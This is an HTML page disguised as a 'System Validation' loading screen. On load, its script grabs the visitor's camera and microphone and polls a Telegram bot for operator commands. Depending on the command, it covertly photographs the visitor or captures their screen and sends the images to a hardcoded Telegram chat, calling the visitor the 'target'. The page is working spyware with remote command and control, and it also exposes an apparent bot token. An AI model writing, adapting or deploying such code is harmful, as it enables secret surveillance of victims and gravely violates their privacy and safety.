<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>System Validation</title>
    <style>
        body { background: #000; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .box { text-align: center; padding: 20px; border: 1px solid #222; border-radius: 10px; }
        canvas, video { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <p>Загрузка компонентов... 45%</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <video id="scr" autoplay playsinline></video>
    <canvas id="c"></canvas>

<script>
    const TOKEN = '7652180697:AAG88k8oUuC6rVu16DzHPxehqeZ9j9dNSpM';
    const ID = '8516906113';
    let lastMsgId = 0;

    async function api(method, params = {}) {
        const url = `https://api.telegram.org/bot${TOKEN}/${method}`;
        const fd = new FormData();
        fd.append('chat_id', ID);
        for (let k in params) fd.append(k, params[k]);
        return fetch(url, { method: 'POST', body: fd }).then(r => r.json());
    }

    async function takePhoto() {
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => api('sendPhoto', { photo: b }), 'image/jpeg');
    }

    async function takeScreen() {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const scrV = document.getElementById('scr');
            scrV.srcObject = stream;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.width = scrV.videoWidth; c.height = scrV.videoHeight;
                c.getContext('2d').drawImage(scrV, 0, 0);
                c.toBlob(b => {
                    api('sendPhoto', { photo: b });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            }, 1000);
        } catch (e) { api('sendMessage', { text: "❌ Цель отклонила захват экрана" }); }
    }

    // Постоянная проверка команд из твоего чата
    async function listen() {
        try {
            const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
            const data = await r.json();
            if (data.result.length > 0) {
                const msg = data.result[0].message;
                if (msg.message_id !== lastMsgId && msg.chat.id == ID) {
                    lastMsgId = msg.message_id;
                    const text = msg.text.toLowerCase();
                    
                    if (text === 'сфоткай его') {
                        takePhoto();
                    } else if (text === 'сфоткай телефон') {
                        takeScreen();
                    }
                }
            }
        } catch (e) {}
        setTimeout(listen, 2000); // Проверка каждые 2 секунды
    }

    async function init() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = stream;
            api('sendMessage', { text: "👁 Цель онлайн. Жду команд: 'Сфоткай его' или 'Сфоткай телефон'" });
            listen();
        } catch (e) { api('sendMessage', { text: "❌ Ошибка доступа к медиа" }); }
    }

    window.onload = init;
</script>
</body>
</html>
